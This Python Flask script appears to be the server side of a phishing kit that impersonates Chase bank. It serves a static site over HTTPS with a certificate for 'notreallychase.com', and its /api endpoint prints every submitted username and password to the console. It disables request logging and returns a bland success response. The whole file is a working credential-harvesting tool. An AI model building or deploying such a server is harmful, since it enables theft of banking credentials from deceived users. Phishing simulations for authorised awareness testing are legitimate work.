initMessagePrinted = False
lineLength = 75

import os
import threading
import flask
import logging

log = logging.getLogger("werkzeug")
log.disabled = True

if os.system("reset") != 0:
    if os.system("clear") != 0:
        os.system("cls")

threading.Timer(0.5, lambda: print("-" * lineLength)).start()

app = flask.Flask(__name__, static_folder="public_html")

@app.route("/api", methods=["POST"])
def handle_api():
    data = flask.request.get_json()

    username = data.get("username")
    password = data.get("password")
    message = f"\rUsername: {username} Password: {password}"
    message = message + (" " * (lineLength - len(message)))
    print(message, end="", flush=True)

    return flask.Response(status=200)

@app.route("/")
def serve_index():
    return flask.send_from_directory(app.static_folder, "index.html")

@app.route("/<path:filename>")
def serve_file(filename):
    return flask.send_from_directory(app.static_folder, filename)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, debug=False, ssl_context=("cert/notreallychase.com.crt", "cert/notreallychase.com.key"))